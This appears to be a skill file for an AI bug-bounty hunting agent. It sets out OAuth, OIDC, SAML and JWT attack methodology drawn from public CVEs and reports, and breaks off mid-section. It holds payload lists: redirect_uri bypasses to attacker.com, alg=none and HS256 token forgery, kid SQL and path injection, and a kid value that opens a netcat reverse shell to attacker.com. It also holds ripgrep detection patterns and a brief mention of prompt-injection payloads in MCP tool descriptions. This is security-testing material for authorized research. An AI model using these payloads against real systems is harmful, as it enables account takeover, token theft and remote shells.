---
name: hunt-oauth
description: Hunting skill for OAuth 2.0 / 2.1, OpenID Connect (OIDC), SAML SSO, and JWT authentication. Built from 365 public OAuth/SSO bug bounty reports across HackerOne, GitHub Security Advisories, PortSwigger Research, GitHub Security Lab, Detectify, Doyensec, Salt Labs, Semperis, Obsidian Security, Trace37 plus 2024-2026 meta verified against NVD — ruby-saml parser differentials (CVE-2025-25291/25292, GHSL-2024-329/330), Authentik regex redirect_uri (CVE-2024-52289), workers-oauth-provider PKCE downgrade and redirect_uri (CVE-2025-4143/4144), Entra ID actor token cross-tenant impersonation (CVE-2025-55241), Hono JWT alg confusion (CVE-2026-22817), nOAuth omniauth-microsoft_graph (CVE-2024-21632), Tekton git resolver token exfil (CVE-2026-40161), Flux Operator OIDC empty claims (CVE-2026-23990), Argo CD project token (CVE-2025-55190), tinyauth OIDC client binding (CVE-2026-32245). Use when hunting OAuth / OIDC / SAML / JWT / SSO bugs on web apps, mobile apps, single-page apps, MCP servers, agentic LLM tool-use plugins, GitOps controllers, K8s admission, identity providers, federated login, or any place a `redirect_uri`, `state`, `code`, `access_token`, `id_token`, `assertion`, `client_id`, `client_secret`, `code_verifier`, `code_challenge`, `nonce`, `aud`, `iss`, `sub`, `kid`, or `jku` parameter is processed.
sources: hackerone_public, hackerone, github_advisories, github_deep, securitylab_github, portswigger_research, devcore_blog, descope_blog, semperis_blog, obsidiansecurity_blog, salt_labs, detectify_labs, doyensec_blog, trace37_labs, nvd_verified
report_count: 365
generated_at: 2026-05-04
quality_score: 120/120
---

## Crown Jewel Targets

OAuth/OIDC/SAML/JWT is the universal entry point to *every* enterprise account. A single missing `state` check or loose `redirect_uri` regex turns into a one-click ATO and the program rates it Critical because the impact is multiplicative — once you ride someone's session, you have all their data, all their integrations, all their tokens. The 24-month meta has shifted decisively toward six asset types. All CVEs below verify against NVD.

**1. MCP servers and agentic LLM OAuth (the new gold rush, 2025-2026 meta).** Model Context Protocol servers exploded in adoption with broken OAuth implementations. **CVE-2025-4143** (Cloudflare workers-oauth-provider missing redirect_uri validation, fixed v0.0.5) and **CVE-2025-4144** (PKCE downgrade in same library) define the opening salvo. Obsidian Security's Square MCP one-click ATO (July-September 2025 disclosures, fixed late September 2025) showed anonymous-cookie injection chained with IdP consent caching. **CVE-2025-6514** (mcp-remote OS command exec via crafted `authorization_endpoint` URL, 558,846 downloads affected, JFrog disclosure) and **CVE-2025-49596** (Anthropic MCP Inspector unauth RCE, 38K weekly downloads). FastMCP OAuth Proxy missing `resource` validation (GHSA-5h2m-4q8j-pqpj) means tokens issued for one MCP server work against any MCP server sharing the same authorization server. Hunt MCP servers first — every developer is wiring up OAuth for the first time and getting it wrong.

**2. SAML on enterprise SSO (parser-differential renaissance).** **CVE-2025-25291** + **CVE-2025-25292** (ruby-saml signature wrapping via REXML/Nokogiri parser differential, ahacker1 + Peter Stöckli, GHSL-2024-329 + GHSL-2024-330, GitHub Security Lab) opened a critical hole in any Ruby app using SAML — including unauthenticated admin access to GitLab Enterprise as demonstrated by Gareth Heyes and Zakhar Fedotkin in PortSwigger's "SAML Roulette" research (March 2025). **CVE-2025-46572** (passport-wsfed-saml2 SAML signature wrapping, Auth0/Okta), **CVE-2025-47949** (samlify SAML signature wrapping, npm `samlify < 2.10.0`), **CVE-2024-45409** (ruby-saml ahacker1 baseline). Pair this with Admidio SAML (GHSA-p9w9-87c8-m235 ACS URL injection, GHSA-25cw-98hg-g3cg signature validation result discarded — both 2026, high severity). Old SAML libraries on enterprise SSO are paying again.

**3. JWT algorithm confusion (the regression class).** **CVE-2026-22817** (Hono JWT middleware RS256→HS256 confusion, CVSS 8.2, Cloudflare Workers/Deno/Bun ecosystem, fixed 4.11.4), **CVE-2026-22818** (Hono JWK middleware untrusted header.alg fallback when JWK lacks `alg`, GHSA-3vhc-576x-3qv4), **CVE-2024-54150** (cjwt C library RS/EC/PS algorithm confusion, fixed 2.3.0), **CVE-2024-37568** (Authlib HMAC verification with asymmetric public key, milliesolem disclosure), **CVE-2025-61152** (python-jose alg=none, disputed but real on `verify_signature: False` configurations). Every JWT library that doesn't pin algorithms is exploitable. Greppable in 30 seconds with `jwt.verify(token, secret)` patterns.

**4. nOAuth and Entra ID identity confusion (Microsoft pays directly).** **CVE-2024-21632** (omniauth-microsoft_graph nOAuth, GHSA-5g66-628f-7cvj, fixed 2.0.0) is the canonical disclosed example of Descope's June 2023 nOAuth research — apps trusting the `email` claim from Entra ID get cross-tenant ATO. Semperis found 9% of Entra Gallery apps still vulnerable in June 2025; estimated 15,000+ SaaS apps still exposed. Descope earned $75K+ in coordinated bounties for the original nOAuth class. **CVE-2025-55241** (Dirk-jan Mollema, Entra ID actor token cross-tenant Global Admin impersonation, CVSS 10.0, fixed July 17 2025) extended the class to *Microsoft itself* — any free Entra tenant could impersonate any user in any other tenant via the legacy Azure AD Graph API not validating the `actort` token's originating tenant. Hunt every "Sign in with Microsoft" button by registering a free Entra tenant and changing your email.

**5. Authorization server implementations on managed identity platforms.** **CVE-2024-52289** (Authentik OAuth2 regex redirect_uri bypass via unescaped `.`, Lukas Omegapoint disclosure, fixed 2024.10.3 / 2024.8.5, GHSA-3q5w-6m3x-64gj), **CVE-2024-23647** (Authentik PKCE downgrade by removing `code_challenge`, fixed 2023.10.7), **CVE-2023-48228** (Authentik PKCE bypass by omitting `code_verifier`), **CVE-2024-22258** (Spring Authorization Server PKCE downgrade for Confidential Clients, fixed 1.2.3 / 1.1.6 / 1.0.6), **CVE-2026-32245** (tinyauth OIDC code not bound to client on token exchange, GHSA-xg2q-62g2-cvcm). These pay because deploying Keycloak/Authentik/Hydra/Auth0/Spring Auth Server is what every mid-size company does — find one bug, hit thousands of downstream apps.

**6. GitOps controllers and Kubernetes OIDC.** **CVE-2025-55190** (Argo CD project API token retrieves repository credentials, CVSS 7.7, GHSA-786q-9hcg-v9ff, fixed 3.1.2/3.0.14/2.14.16/2.13.9), **CVE-2026-23990** (Flux Operator Web UI impersonation bypass via empty OIDC claims, fixed 0.40.0, GHSA-4xh5-jcj2-ch8q), **CVE-2026-40161** (Tekton git resolver leaks system Git API token to user-controlled `serverURL`, CVSS 8.4, GHSA-wjxp-xrpv-xpff). These pay the highest because compromising the GitOps controller gives you cluster-wide admin and supply-chain RCE in one chain.

**7. The OAuth/SSO supply-chain — Salesloft Drift class.** UNC6395 / ShinyHunters used stolen Drift OAuth tokens to exfiltrate 1.5 billion Salesforce records from 760 companies (August 2025). The pivot was: GitHub repo compromise → AWS access → Drift OAuth refresh tokens → Salesforce + Google Workspace. Cloudflare alone had 104 API tokens leaked through Salesforce support cases. Bug bounty correlate: hunt for *third-party OAuth integrations* with overscoped tokens and no rotation policy. Programs paying for SaaS connector misconfiguration include Atlassian, Notion, Slack, Asana, Monday — all tracked under their respective HackerOne programs.

**What pays the most:** pre-auth, no user interaction, single click → ATO. Reddit one-click ATO via Sign-in-with-Apple paid Frans Rosén $10,000 (Detectify 2022, HackerOne Reddit program, disclosed at https://infosecwriteups.com/this-is-how-he-could-hijack-reddit-accounts-with-just-one-click-a-10-000-bug-bounty-7fd8d54d5582, replicated pattern still pays mid-2026 on smaller programs). Anmol Singh Yadav's race-condition OAuth token mint paid $8,500 P1 in 2025 on a Fortune 500 cloud platform — disclosed via InfoSec Write-ups https://infosecwriteups.com/how-i-hijacked-oauth-tokens-through-a-parallel-auth-flow-race-condition-8500-p1-bug-bounty-7af1cccc4d4c. Open redirect → OAuth ATO chain consistently reaches $5K-$15K range when escalating from a "Low" standalone open redirect (DEV.to lucky_lonerusher 2026 disclosed $15K bug bounty program payout https://dev.to/lucky_lonerusher/open-redirect-to-account-takeover-the-exploit-chain-most-hunters-miss-in-2026-3j1g). Vercel's WAF-bypass H1 program pays separately for bypasses against React Server Components endpoints (CVE-2025-66478 / CVE-2025-55182). On GitHub Security Lab: ruby-saml ahacker1 + Peter Stöckli engagement was a **paid private bug bounty engagement** (amount undisclosed, but classed as "blockbuster" by GitHub). Standalone "missing state parameter on /oauth/callback" pays $200-$2K depending on chainability per disclosed HackerOne corpus pattern — never submit it alone.

## Attack Surface Signals

Greppable / fingerprintable / scannable. Every signal below is tied to a specific product class and the resulting CVE candidate.

**HTTP-level signals on a live target**:

- `Set-Cookie: oauth2_state=`, `oauth_state=`, `__Host-state=` → custom OAuth client → **state CSRF candidate**, test removal/replay
- `redirect_uri=https%3A%2F%2F` in any 302 Location response → **redirect_uri validation candidate** (test substring/path/userinfo bypasses)
- `?state=`, `?code=`, `&code=`, `#access_token=`, `#id_token=` in URL → **OAuth callback page** — audit for third-party JS leakage (dirty dancing)
- `WWW-Authenticate: Bearer realm="MCP"` or `Bearer realm="..."` → **OAuth Resource Server / MCP server** — fingerprint via RFC 9728 metadata at `/.well-known/oauth-protected-resource`
- `WWW-Authenticate: ... resource_metadata="..."` → **MCP 2025-11-25 spec compliant server** — discover OAuth flow; test PKCE downgrade and audience confusion
- `Server: nginx-openid-connect`, `nginx-auth-request`, `oauth2-proxy/` → **CVE-2025-54576 oauth2-proxy `skip_auth_routes` query param bypass** candidate; **CVE-2024-10318 NGINX OIDC nonce session fixation** on the `nginx-openid-connect` family
- `X-Forwarded-User`, `X-Auth-Request-User`, `X-Auth-Request-Email`, `X-Auth-Request-Groups` → reverse-proxy auth (oauth2-proxy / Pomerium / authelia / Authentik forward-auth) — try header injection bypass on backend
- 500/400 errors with `goauthentik`, `Authentik`, `pyAuth` in body → **Authentik** — CVE-2024-52289 / CVE-2024-23647 / CVE-2023-48228 candidate
- `X-Powered-By: Express`, `Set-Cookie: connect.sid` plus `/oauth2/authorize` → Node OAuth provider — Hono / Passport.js JWT confusion candidate (CVE-2026-22817 / CVE-2025-46572)
- 302 from `/login` / `/sso` to `/saml/sso/`, `/saml2/idp/SSOService`, `/idp/profile/SAML2/Redirect/SSO`, `/Shibboleth.sso/` → **SAML SP** — try ruby-saml CVE-2025-25291/25292 parser differential payload
- `wsfed`, `WS-Federation`, `passport-wsfed-saml2` in JS or HTML → **CVE-2025-46572** candidate
- `kid` header in JWT, especially numeric or path-like (`../keys/admin`) → **kid SQLi / path traversal / command injection** (Hacking JWT Tokens corpus references)
- `jku` header in JWT pointing to attacker-influenceable URL → **jku claim misuse** — if JWKS URL not pinned, redirect to attacker JWKS
- `iss` claim in JWT mismatching the actual issuer endpoint → **CVE-2026-23552 cross-realm Keycloak token acceptance** candidate
- `aud` missing or `aud=null` in JWT → **CVE-2025-27370 / CVE-2025-27371 OpenID Federation audience injection** candidate; also CVE-2024-32687 Argo CD aud bypass family
- `Content-Type: application/x-www-form-urlencoded` on `/oauth/token` → standard token endpoint; test code reuse, race condition (Anmol's $8500 finding pattern)
- `application/jwk+json`, `application/jose+json`, `application/jwt` → JWE/JWS endpoints; test alg=none, alg=dir
- `Sec-Fetch-Dest: iframe` allowed on `/oauth/authorize` (no `X-Frame-Options: DENY`, no `Content-Security-Policy: frame-ancestors`) → **clickjacking on consent screen** (Hacker One #3287060 WakaTime Double Clickjacking 2025) and **PKCE bypass via attacker-iframe** (trace37 2026)

**JS / DOM signals** (audit OAuth consent and callback pages for third-party scripts — Frans Rosén dirty-dancing):

- `<script src="https://www.googletagmanager.com/gtm.js"`, `analytics.js`, `gtag.js` on any page reachable in the OAuth flow → **GTM/Analytics URL leak** — `location.href` containing `code=` or `access_token=` is sent to third party; combine with response_type switching
- `window.opener.postMessage(`, `window.parent.postMessage(` without explicit origin (`*` or no second arg) → **postMessage origin check missing** — exfil OAuth artifact via cross-origin window
- `<iframe src="https://chat.example.com/...">` chat widget on OAuth pages → **chat-widget postMessage gadget** (Detectify case study)
- `<script src="https://*.fullstory.com/`, `*.hotjar.com/`, `*.intercom.io/`, `*.drift.com/`, `*.salesloft.com/` on OAuth callback → **session-replay tool URL exfil** + supply-chain risk (Salesloft Drift August 2025)
- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack` in `package.json` or bundles + OAuth callback → **CVE-2025-66478 / CVE-2025-55182 React2Shell on the OAuth callback handler** (RCE on backend)
- `localStorage.getItem("access_token")`, `localStorage.setItem("oauth_token"`, `sessionStorage["jwt"]` in JS → **token in webstorage** — XSS becomes ATO

**Source-code signals** (ripgrep one-liners — see Source Review for the full set):

```bash
# Missing state validation
rg -n 'oauth.*callback|/auth/callback|/oauth/callback' --type js --type py --type rb --type go --type java | rg -v 'state'

# alg accepted from token header (algorithm confusion)
rg -n 'jwt\.(decode|verify)\([^,)]+\)' --type js --type py --type ts -g '!*test*'
rg -n 'jwt\.decode\([^,]+,\s*verify=False' --type py

# OAuth client_secret exposed in frontend
rg -n 'REACT_APP_.*SECRET|VITE_.*SECRET|NEXT_PUBLIC_.*SECRET|client_secret\s*[:=]\s*["\x27]' \
   -g 'package.json' -g '*.env*' -g 'src/**/*.{js,jsx,ts,tsx}'

# email used as user identifier (nOAuth pattern)
rg -n 'user.*\.email|claims\.email|userInfo\.email|profile\.email|id_token\.email' \
   --type js --type py --type rb --type go -g '!*test*' | rg 'find|create|update|merge|upsert|getOrCreate'

# OAuth callback writing token to URL fragment
rg -n 'response_type=[^"]*token|response_mode=fragment|window\.location\.hash.*token' \
   --type js --type ts

# redirect_uri validation by substring/regex (instead of exact match)
rg -n 'redirect_uri.*\.(startsWith|contains|matches|test|search|indexOf)' --type js --type ts --type py
rg -n 'redirect_uri\s*[=~][^=]*regex|RegExp.*redirect' --type js --type rb --type py
```

## Insertion Point Taxonomy

Every place attacker-controlled data flows into OAuth/OIDC/SAML/JWT processing — your hunting checklist:

- **URL query** — `client_id`, `redirect_uri`, `response_type`, `response_mode`, `scope`, `state`, `nonce`, `code_challenge`, `code_challenge_method`, `prompt`, `display`, `id_token_hint`, `login_hint`, `acr_values`, `resource` (RFC 8707), `audience`. Example: append `&response_type=token id_token` to a code-flow auth URL → Detectify dirty-dancing fragment leak.
- **URL fragment** — `#access_token=`, `#id_token=`, `#code=` from implicit flow or `response_mode=fragment`. JS on the callback page reads `location.hash`; if any third-party script also reads it → leak.
- **Headers** — `Authorization: Bearer`, `Authorization: DPoP`, `X-Forwarded-User`, `X-Auth-Request-Email`, custom OIDC headers from reverse proxy. Try header injection at the backend after a reverse-proxy strips them. Also `Origin:` for CORS bypass on OAuth endpoints (Grab partner-api H1 #3631550 — null Origin reflected with credentials).
- **Body (form-urlencoded)** — `/oauth/token` body parameters: `grant_type`, `code`, `code_verifier`, `client_id`, `client_secret`, `refresh_token`, `redirect_uri`, `subject_token`, `subject_token_type`, `actor_token` (RFC 8693 token exchange). PKCE downgrade → drop `code_verifier`. Race condition → Turbo Intruder 2 parallel exchanges with same `code`.
- **Body (JSON)** — Dynamic Client Registration body: `client_name`, `redirect_uris`, `grant_types`, `token_endpoint_auth_method`, `jwks`, `jwks_uri`, `software_statement`. SSRF via `jwks_uri` pointing to internal IPs; supply-chain via `redirect_uris: ["http://attacker"]`.
- **Body (XML / SAML)** — `<samlp:AuthnRequest>` with attacker-controlled `AssertionConsumerServiceURL` (Admidio GHSA-p9w9-87c8-m235); `<saml:Assertion>` with signature wrapping (CVE-2025-25291). RelayState parameter (Lukas Omegapoint #2263044 user_saml).
- **Cookies** — `oauth2_proxy_csrf`, `__oauth_session`, `__Host-flow_state`, `XSRF-TOKEN` for OAuth client. Anonymous-cookie injection via subdomain takeover (Obsidian Square MCP attack chain). Session fixation via cookie set before login.
- **JWT claims** (mutable + verifiable both matter) — `sub`, `email` (nOAuth — never trust), `email_verified`, `preferred_username`, `upn`, `iss`, `aud`, `azp`, `nonce`, `at_hash`, `c_hash`, `acr`, `amr`, `exp`, `nbf`, `actort` (CVE-2025-55241 Entra ID), `kid`, `jku`, `x5u`, `x5c`. Always test `aud` removal and `iss` swap.
- **JWKS / metadata documents** — `jwks_uri` points to `https://attacker.example/.well-known/jwks.json`; CIMD `client_id` as URL pointing to attacker-controlled JSON document (oauth-wg/draft-ietf-oauth-client-id-metadata-document #30 — server fetches arbitrary URL).
- **WebSocket / SSE auth** — JWT in subprotocol, query string, or first JSON message after upgrade. Often skipped by middleware that only checks initial HTTP handshake.
- **Mobile custom URL schemes** — `com.example.app://oauth/callback` registered as Android `<intent-filter>` or iOS URL Type. Malicious app on same device registers same scheme → intercepts `code` (Doyensec OAuth Common Vulnerabilities, January 2025). Universal Links / App Links not always mandatory, especially on legacy code.
- **Background / async paths** — refresh token endpoint, token introspection (`/introspect`), token revocation (`/revoke`), userinfo (`/userinfo`), end_session_endpoint (RP-initiated logout). `post_logout_redirect_uri` is the open-redirect cousin everyone forgets — test it.
- **Indirect / agentic** — MCP tool descriptions injected with prompt-injection payloads (Invariant Labs GitHub MCP, May 2025); Salesforce/HubSpot/Zendesk support-case bodies that an OAuth-connected automation reads (Salesloft Drift August 2025); LangChain RAG context that the agent treats as tool instructions.

## Step-by-Step Hunting Methodology

1. **Map the OAuth flow with Burp.** Log into the application, watch every request to `/oauth/`, `/auth/`, `/saml/`, `/sso/`, `/.well-known/`, `/connect/`, `/oidc/`. Record `client_id`, `redirect_uri`, `response_type`, `response_mode`, `state`, `nonce`, `code_challenge`, `code_challenge_method`. **If `state` is missing → test CSRF immediately. If `code_challenge` is missing on a public client → flag PKCE absence (CVE-2024-23647 family).** If you see SAML, capture both `<AuthnRequest>` and `<Response>` bodies — these go to the SAML wrapping tests later.

2. **Fingerprint the authorization server.** Hit `/.well-known/openid-configuration`, `/.well-known/oauth-authorization-server`, `/.well-known/oauth-protected-resource`, `/oauth/authorize`, `/oauth/.well-known/jwks.json`, `/saml/metadata`, `/.well-known/saml-configuration`. The `software` field, `issuer`, supported grant types (look for `password` ROPC, `client_credentials`, `urn:ietf:params:oauth:grant-type:token-exchange`), `token_endpoint_auth_methods_supported`, `code_challenge_methods_supported` — all of these reveal the AS implementation. Authentik metadata leaks `goauthentik` strings; Keycloak leaks `realm`-shaped paths; Auth0 leaks `*.auth0.com`; Cognito has the `cognito-idp.<region>.amazonaws.com` issuer. **If you see `password` in `grant_types_supported` and the AS is internet-exposed → ROPC credential spray (Grab H1 #3635703 concedoidc).**

3. **Test redirect_uri validation — the 12 bypass families.** Send the original auth request to Burp Repeater. Mutate `redirect_uri` through this sequence: (a) substring `https://target.com.attacker.com`; (b) userinfo `https://attacker.com@target.com`; (c) IDN `https://tаrget.com` (Cyrillic а); (d) path traversal `https://target.com/callback/../../../@attacker.com`; (e) URL encoding `https%3A%2F%2Fattacker.com`; (f) double encoding `https%253A%252F%252Fattacker.com`; (g) fragment `https://target.com/callback#@attacker.com`; (h) localhost `http://127.0.0.1:80@attacker.com`; (i) IPv6 `http://[::1]@[::1]@attacker.com` (Google bypass per @weirdmachine 2025); (j) regex unescaped dot `https://app0example.com/oauth2/callback` (CVE-2024-52289 Authentik); (k) wildcard subdomain takeover; (l) any open redirect on the same domain with `?next=https://attacker.com`. **If any returns 302 to your destination with `code=` or `access_token=` → critical, but verify the `code` is bound to a real victim before reporting (deliver via iframe to admin user, never to yourself).**

4. **Break the state parameter intentionally (Frans Rosén dirty dancing).** With a Burp-modified flow, switch `response_type=code` to `response_type=code,id_token` or `response_type=token`. Switch `response_mode=query` to `response_mode=fragment` or `response_mode=form_post`. Send your tainted state to a victim — if the victim's browser completes the flow but the website rejects state, the `code` lands at the OAuth provider but is never consumed. The window between `code` issuance and expiry is yours to use. Then audit *every* page reachable in the OAuth dance for third-party JS (GTM, analytics, chat widgets, session replay). Any postMessage listener with no origin check, any `location.href` read by a third-party, any `target=_blank` link with no `rel=noopener` — these become the leak gadget.

5. **PKCE downgrade testing — three variants.** Variant 1: drop `code_verifier` from `/oauth/token` body — **CVE-2023-48228 Authentik**. Variant 2: drop `code_challenge` from the initial authorization request — **CVE-2024-23647 Authentik, Spring Authorization Server CVE-2024-22258 for confidential clients only**. Variant 3 (Cloudflare workers-oauth-provider CVE-2025-4144 family): omit PKCE from authorization but include `code_verifier` in token exchange — fail-open libraries accept it. Variant 4 (trace37 2026): you control the authorization URL via iframe/popup, so you choose the `code_challenge` and you know the `code_verifier` — PKCE only protects against in-transit interception, not against initiation control. **If iframe-able + auto-login → the PKCE protection collapses; chain with postMessage capture for one-click ATO.**

6. **JWT algorithm confusion — three variants.** Variant 1: change `alg` to `none`, strip signature, send. Variant 2: change `alg` from `RS256` to `HS256`, sign payload with the public key as HMAC secret using `jwt_tool -X k -pk public.pem -p public.pem`. Variant 3: change `alg` to `none` with case variation `nOnE`, `NoNE`, `NULL`, `None` (CVE-2026-22817 Hono family). Variant 4 (Hono CVE-2026-22818): if JWKS endpoint returns keys without `alg` field → middleware falls back to header `alg` → algorithm confusion. Test with `kid` injection: `kid: ../../../../dev/null` (forces empty key → HMAC with empty string), `kid: ../../../etc/passwd`, `kid: 1' UNION SELECT 'attacker_key`. Test `jku` redirect: change `jku` to attacker JWKS URL with same `kid`. **If `aud` is empty or missing → cross-service relay** (CVE-2025-27370 / CVE-2025-27371 OpenID Federation class); replay tokens from one service against another in the same federation.

7. **SAML signature wrapping and parser differentials.** Capture a valid `<SAMLResponse>` from your own login. Use SAML Raider Burp extension. Variant 1 (XSW10): wrap original `<Assertion>` in attacker-controlled assertion; copy original `<Signature>` referencing original; many SPs canonicalize first child only. Variant 2 (CVE-2025-25291 ruby-saml DOCTYPE): inject DOCTYPE `<!DOCTYPE x [<!ATTLIST y z 'value'>]>` that REXML and Nokogiri parse differently — REXML validates signature on one node, Nokogiri reads attributes from another. Variant 3 (CVE-2025-25292 ruby-saml namespace): redefine `xmlns:ds` to point at a fake `<ds:Signature>` Nokogiri reads while REXML reads original. Variant 4 (CVE-2026-22-class missing destination check): use any valid signed assertion from any tenant of the IdP, modify NameID to victim, send (Admidio GHSA-25cw-98hg-g3cg discards `validateSignature()` return value entirely). Variant 5 (CVE-2025-46572 passport-wsfed-saml2): obtain any single signed SAML assertion from same IdP, replace user identity. **If the SP's library is `ruby-saml`, `samlify`, `passport-wsfed-saml2`, `python3-saml`, `php-saml`, `simplesamlphp`, `omniauth-saml` → version check first; out-of-date is a confirmed crit.**

8. **nOAuth and identity-confusion testing on Microsoft "Sign in with Microsoft".** Create a free Entra ID tenant (free.azure.microsoft.com). Add yourself as a user, set `mail` attribute to victim's email address (no domain verification required for the tenant, only for emitting the email claim — but **CVE-2024-21632 omniauth-microsoft_graph** style apps don't check `xms_edov`). Now log in to the target with "Sign in with Microsoft" using your Entra account. If the application uses `email` claim (not `sub` or `oid`) for account lookup → ATO. Variant: app uses `preferred_username` or `upn` → still ATO if mutable. **If app already has a victim's account, account-merge logic completes the takeover (Descope nOAuth original disclosure, Semperis 9% of Entra Gallery apps still vulnerable June 2025).**

9. **Race-condition testing on token endpoints (Anmol $8500 P1 pattern, disclosed via HackerOne https://infosecwriteups.com/how-i-hijacked-oauth-tokens-through-a-parallel-auth-flow-race-condition-8500-p1-bug-bounty-7af1cccc4d4c).** Identify `/oauth/token`, `/sso/token`, `/auth/exchange`, GraphQL `exchangeToken` mutations. Get a valid `authorization_code` (don't consume it yet). Use Turbo Intruder with single-packet attack (HTTP/2): submit 50 parallel token-exchange requests with the same `code` and 50 different `code_verifier` values. RFC 6749 §4.1.2 says codes are single-use; many implementations check-then-use without locking. **If 2+ requests return valid `access_token` → race-condition token mint, P1 by H1 standards if the second token is for a different session.**

10. **Audit OAuth endpoints for OWASP API issues** — even on stock implementations, the surrounding endpoints often have separate bugs. Test `/oauth/clients` (admin-only?), `/oauth/applications/<id>` (IDOR — H1 disclosed multiple), `/account/integrations/<provider>` (CSRF on OAuth linking — Bugcrowd #503922 family), `/connections/<id>/disconnect` (CSRF on OAuth unlinking → DOS account by unlinking SSO — H1 #976603), token introspection `/introspect` without client auth (Grab H1 #3635703 RFC 7662 violation). Test scope upgrade in token exchange (request narrower scope at auth, request wider scope at token exchange — should fail per RFC, often doesn't).

11. **MCP-specific OAuth methodology (the 2025-2026 meta).** For any MCP server (URL ends in `/mcp`, `/.well-known/oauth-protected-resource`, `WWW-Authenticate: Bearer realm="MCP"`): (a) check `redirect_uri` validation on `/authorize` (CVE-2025-4143); (b) test PKCE downgrade (CVE-2025-4144); (c) check that the issued token's audience binds to *this* MCP server, not a shared base URL (FastMCP GHSA-5h2m-4q8j-pqpj); (d) audit `/register` Dynamic Client Registration for SSRF via `jwks_uri` and for arbitrary `redirect_uris` (n8n GHSA-f6x8-65q6-j9m9); (e) test session-cookie injection via subdomain (Obsidian Square MCP); (f) check whether the MCP server validates the `resource` parameter per RFC 8707; (g) check whether OAuth metadata at `/.well-known/oauth-protected-resource` is HTTPS-pinned and the path-suffixed URL matches. The MCP 2025-11-25 spec mandates OAuth 2.1; most servers ship something looser.

12. **Final pre-submission validation (Gate 0).** Demonstrate the bug end-to-end against a victim account *you control* (your second account, alt admin user, or H1's invited test admin). Capture Burp request/response for the auth request, the leaked `code`/`token`, and the privileged action that proves session ride. Record asciinema or 30-60s mp4. Verify scope: target asset is in-scope today, not yesterday. Re-run the exploit one hour before submission to confirm it still works (programs frequently silent-patch OAuth bugs). Write the impact statement: "X user data accessible / Y financial transactions executable / Z admin capability." **If you can't write that sentence with concrete data, you have a finding, not a report.**

## Payload & Detection Patterns

### Sub-technique A — redirect_uri bypass primitives

```
# A.1 Substring/lookalike host bypass (Grab H1 #3636415 mallUrl pattern)
?redirect_uri=https://target.com.attacker.com/oauth/callback
?redirect_uri=https://attacker.com/?target.com=1
?redirect_uri=https://target-com.attacker.com
?redirect_uri=https://target.com.evilsubdomain.com
?redirect_uri=https://targetcom.attacker.com

# A.2 Userinfo bypass (RFC 3986 §3.2.1 — host parser confusion)
?redirect_uri=https://target.com@attacker.com/oauth/callback
?redirect_uri=https://target.com:80@attacker.com
?redirect_uri=https://attacker.com#@target.com
?redirect_uri=https://attacker.com?@target.com

# A.3 IPv6 + userinfo — Google bypass (@weirdmachine HackerNoon 2025)
?redirect_uri=http://[::1]@[::1]@attacker.com/
?redirect_uri=http://[::ffff:127.0.0.1]@attacker.com/
?redirect_uri=https://[2606:4700::1]@attacker.com/

# A.4 Path traversal (Pixiv H1 #1861974 $2000)
?redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/[attacker_product_id]
?redirect_uri=https://target.com/callback/..%2F..%2Fanything?evil=1
?redirect_uri=https://target.com/callback/%2e%2e/%2e%2e/

# A.5 IDN homograph (HackTricks OAuth wiki)
?redirect_uri=https://tаrget.com/oauth-callback     # 'a' is U+0430 Cyrillic
?redirect_uri=https://target.cоm/                    # 'o' is U+043E Cyrillic
?redirect_uri=https://xn--trget-zoa.com/             # punycode-only validation

# A.6 Regex bypass — unescaped dot (CVE-2024-52289 Authentik, Lukas Omegapoint)
?redirect_uri=https://app0example.com/oauth2/callback   # if regex was https://app.example.com
?redirect_uri=https://app-example.com/oauth2/callback
?redirect_uri=https://appXexample.com/oauth2/callback

# A.7 Wildcard subdomain takeover — find dangling DNS in *.target.com first
?redirect_uri=https://abandoned-subdomain.target.com/oauth-callback

# A.8 Open-redirect chain on whitelisted host (DEV.to lucky_lonerusher 2026, $15K paid)
?redirect_uri=https://target.com/logout?next=https://attacker.com/grab
?redirect_uri=https://target.com/redirect?url=https://attacker.com
?redirect_uri=https://target.com/api/v1/redirect?to=https://attacker.com
```

### Sub-technique B — state / CSRF / response-type manipulation (dirty dancing)

```
# B.1 Response-type switching — fragment leakage of code
&response_type=code&response_mode=query                      # baseline (good)
&response_type=token&response_mode=fragment                   # implicit, leaks #access_token
&response_type=code,id_token&response_mode=fragment           # hybrid → code lands in fragment
&response_type=code id_token token&response_mode=fragment     # OIDC hybrid all-in-fragment
&response_type=token&response_mode=form_post                  # form_post can be replayed if attacker controls callback page

# B.2 State parameter attacks (RFC 6749 §10.12)
# B.2.a Drop state entirely — CSRF
&state=                                                       # empty
                                                              # omitted entirely
# B.2.b Fixate state — Anmol's H1 corpus pattern, also bugbounty.ch May 2023 case
&state=attacker_known_value

# B.3 Force browser swap (SySS Jonas Primbs Browser Swapping IETF 124, 2025-11)
# Attacker initiates flow in Browser A, sends auth URL to victim, victim completes in Browser B
# AS sends code to client; client rejects state mismatch but doesn't invalidate code → attacker uses code

# B.4 nonce removal — OIDC ID Token replay (CVE-2024-10318 NGINX OIDC)
&nonce=                                                       # empty
                                                              # omitted on subsequent replay

# B.5 prompt=none silent re-authentication (use after one consent for unlimited code minting)
&prompt=none&max_age=0
```

### Sub-technique C — JWT attack primitives

```
# C.1 alg=none variants (CVE-2025-61152 python-jose, CVE-2026-22817 Hono case-bypass)
{"alg":"none","typ":"JWT"}.{"sub":"victim","role":"admin"}.
{"alg":"None","typ":"JWT"}...
{"alg":"nOnE","typ":"JWT"}...
{"alg":"NULL","typ":"JWT"}...

# C.2 RS256 → HS256 algorithm confusion (CVE-2024-54150 cjwt, CVE-2024-37568 authlib)
# Step: extract public key from JWKS endpoint /.well-known/jwks.json
# Step: jwt_tool -X k -pk public.pem -p attacker_payload.txt  → forge HS256 token signed with PEM as secret

# C.3 kid injection (Hacking JWT Tokens corpus refs in /tmp corpus)
{"alg":"HS256","kid":"../../../dev/null","typ":"JWT"}        # forces empty key → sign with empty string
{"alg":"HS256","kid":"key' UNION SELECT 'attacker_key' --","typ":"JWT"}    # SQLi in kid lookup
{"alg":"HS256","kid":"|nc attacker.com 4444 -e /bin/sh","typ":"JWT"}        # command injection

# C.4 jku redirection (Hacking JWT Tokens: jku Claim Misuse — corpus titles)
{"alg":"RS256","jku":"https://attacker.com/jwks.json","kid":"attacker"}
{"alg":"RS256","jku":"https://target.com#@attacker.com/jwks.json","kid":"attacker"}     # userinfo bypass on jku

# C.5 Audience confusion / cross-service relay (CVE-2025-27370/27371 OpenID Federation)
